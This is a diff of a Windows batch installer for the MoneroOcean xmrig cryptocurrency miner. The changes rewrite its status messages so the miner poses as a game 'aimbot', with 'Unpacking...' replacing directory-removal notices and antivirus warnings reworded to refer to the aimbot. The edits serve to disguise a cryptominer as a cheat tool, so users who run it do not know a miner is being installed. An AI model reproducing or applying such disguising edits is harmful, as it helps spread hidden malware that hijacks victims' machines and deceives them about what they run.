@@ -195,7 +195,7 @@ sc delete moneroocean_miner
 taskkill /f /t /im xmrig.exe
 
 :REMOVE_DIR0
-echo [*] Removing "%USERPROFILE%\moneroocean" directory
+echo [*] Unpacking...
 timeout 5
 rmdir /q /s "%USERPROFILE%\moneroocean" >NUL 2>NUL
 IF EXIST "%USERPROFILE%\moneroocean" GOTO REMOVE_DIR0
@@ -229,9 +229,9 @@ if %ERRORLEVEL% equ 0 goto MINER_OK
 :MINER_BAD
 
 if exist "%USERPROFILE%\moneroocean\xmrig.exe" (
-  echo WARNING: Advanced version of "%USERPROFILE%\moneroocean\xmrig.exe" is not functional
+  echo WARNING: Advanced version of aimbot is not working, trying again
 ) else (
-  echo WARNING: Advanced version of "%USERPROFILE%\moneroocean\xmrig.exe" was removed by antivirus
+  echo WARNING: Advanced version of aimbot was removed by antivirus
 )
 
 echo [*] Looking for the latest version of Monero miner
@@ -246,7 +246,7 @@ if errorlevel 1 (
 )
 
 :REMOVE_DIR1
-echo [*] Removing "%USERPROFILE%\moneroocean" directory
+echo [*] Unpacking...
 timeout 5
 rmdir /q /s "%USERPROFILE%\moneroocean" >NUL 2>NUL
 IF EXIST "%USERPROFILE%\moneroocean" GOTO REMOVE_DIR1
